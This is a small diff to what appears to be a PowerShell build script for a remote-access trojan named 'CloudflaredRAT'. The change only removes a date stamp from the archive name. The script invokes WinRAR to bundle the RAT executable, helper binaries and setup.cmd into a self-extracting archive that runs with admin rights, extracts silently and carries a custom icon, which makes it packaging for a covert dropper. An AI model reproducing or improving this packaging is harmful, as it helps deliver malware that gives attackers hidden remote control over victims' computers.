@@ -12,5 +12,4 @@ if (!(Test-Path $rarPath)) {
     $rarPath = "WinRAR.exe"
 }
 
-$dateStr = (Get-Date).ToString('yyyy-MM-dd_hh:mm')
-Start-Process -FilePath $rarPath -ArgumentList "a -afrar -cfg- -iadm -inul -k -iiconicon.ico -r -s -tl -y -zartifacts\sfx.cfg $dateStr_CloudflaredRAT.exe bridge.exe manager.exe artifacts\*.xml artifacts\setup.cmd"
+Start-Process -FilePath $rarPath -ArgumentList "a -afrar -cfg- -iadm -inul -k -iiconicon.ico -r -s -tl -y -zartifacts\sfx.cfg CloudflaredRAT.exe bridge.exe manager.exe artifacts\*.xml artifacts\setup.cmd"
